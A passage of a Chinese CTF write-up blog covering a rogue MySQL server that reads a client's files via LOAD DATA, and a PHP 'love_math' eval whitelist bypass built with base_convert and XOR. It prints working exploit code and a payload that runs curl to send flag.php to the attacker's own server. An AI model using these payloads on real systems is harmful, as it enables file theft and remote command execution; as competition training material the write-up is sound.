+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">file=<span class="string">&quot;/fll1llag_h3r3&quot;</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.bind((<span class="string">&quot;&quot;</span>,<span class="number">3306</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">c,ip=s.accept()</span><br><span class="line">c.sendall(<span class="string">&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span>)</span><br><span class="line">c.recv(<span class="number">666</span>)</span><br><span class="line">c.sendall(<span class="string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">c.recv(<span class="number">666</span>)</span><br><span class="line">c.sendall(<span class="built_in">chr</span>(<span class="built_in">len</span>(file)+<span class="number">1</span>)+<span class="string">&quot;\x00\x00\x01\xFB&quot;</span>+file)</span><br><span class="line"><span class="built_in">print</span> c.recv(<span class="number">666</span>)</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure>
+
+<p>伪造结果：</p>
+<p><img data-src="1556339247851.png" alt="1556339247851"></p>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/apossin/p/10127496.html">伪造mysql服务端实现任意读取</a> </li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3973">利用MySQL LOAD DATA特性达到任意文件读取</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.bodkin.ren/index.php/archives/166/">DDCTF 2017 SQL注入-绕过未知字段名</a> </li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4914">通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注</a></li>
+</ul>
+<h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h1><p>calc.php泄露源码</p>
+<p><img data-src="1556340949356.png" alt="1556340949356"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过base_convert将十进制转三十六进制，可以得到小写字母和数字共三十六种字符，再通过异或、与、或进一步得到更大的字符集。受限于总长度为小于80个字符，将base_convert赋值给pi方便重复使用。</p>
+<p>遍历发现<code>123456789abcdefghijklmnopqrstuvwxyz</code> 和<code>123456789abcdefghijklmnopqrstuvwxyz</code> 按位异或可得到可打印字符集<code>A@CBEDGFIHKJMLONQPSRUTWVYX[Z]\_^ </code> ，可以构造出<code>_GET</code> 。使用花括号取偏移，再使用exec执行命令，构造出等价于<code>exec($_GET&#123;1&#125;)</code> 的payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">res=<span class="built_in">set</span>()</span><br><span class="line">ii=<span class="string">&quot;&quot;</span></span><br><span class="line">jj=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=<span class="string">&quot;_GET&quot;</span> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> cmd:</span><br><span class="line">	<span class="keyword">for</span> i,j <span class="keyword">in</span> itertools.product(<span class="string">&quot;123456789abcdefghijklmnopqrstuvwxyz&quot;</span>,<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>):</span><br><span class="line">		kk=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">		<span class="keyword">if</span> k==kk:</span><br><span class="line">			ii=ii+i</span><br><span class="line">			jj+=j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		res.add(kk)</span><br><span class="line"><span class="built_in">print</span> ii,jj <span class="comment">#1111 nvte</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(res) <span class="comment"># A@CBEDPSRUTWVYX[Z]\_^</span></span><br></pre></td></tr></table></figure>
+
+<p>将<code>1111</code> 和<code>nvte</code> 作为36进制数，转为10进制数分别得到：47989和1114322。可以使用<a target="_blank" rel="noopener" href="https://tool.lu/hexconvert/">在线工具</a>或PHP的base_convert函数转换。</p>
+<p>最终访问路径为<code>calc.php?c=$pi=base_convert;$pi(696468,10,36)($&#123;$pi(47989,10,36)^$pi(1114322,10,36)&#125;&#123;1&#125;)&amp;1=curl%20my.vps%20-F%20&#39;data=@flag.php&#39;</code> 。在服务端监听即可收到flag.php内容。</p>
+<p>初步实现命令执行</p>
+<p><img data-src="1556339847768.png" alt="1556339847768"></p>
+<p>获取flag</p>
+<p><img data-src="1556339857688.png" alt="1556339857688"></p>
+<p>如果长度放宽一点，这些思路也许也可以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(cat &#96;ls&#96;)</span><br><span class="line">$pi&#x3D;base_convert;$pi(1751504350,10,36)($pi(963893486026,10,36)&amp;$pi(963910328843,10,36))</span><br><span class="line"></span><br><span class="line">system(cat $(ls))</span><br><span class="line">$pi&#x3D;base_convert;pi(1751504350,10,36)(pi(573877,10,36)&amp;pi(573887,10,36)$(pi((784,10,36))))</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/190326-clock-manage-problem/" rel="prev" title="拨钟问题">
+      <i class="fa fa-chevron-left"></i> 拨钟问题
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JustSoso"><span class="nav-number">1.</span> <span class="nav-text">JustSoso</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">整体方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80"><span class="nav-number">1.2.</span> <span class="nav-text">问题一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="nav-number">1.3.</span> <span class="nav-text">问题二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89"><span class="nav-number">1.4.</span> <span class="nav-text">问题三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95"><span class="nav-number">1.5.</span> <span class="nav-text">解法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%A8%E5%AE%87%E5%AE%99%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84SQL"><span class="nav-number">2.</span> <span class="nav-text">全宇宙最简单的SQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#love-math"><span class="nav-number">3.</span> <span class="nav-text">love_math</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
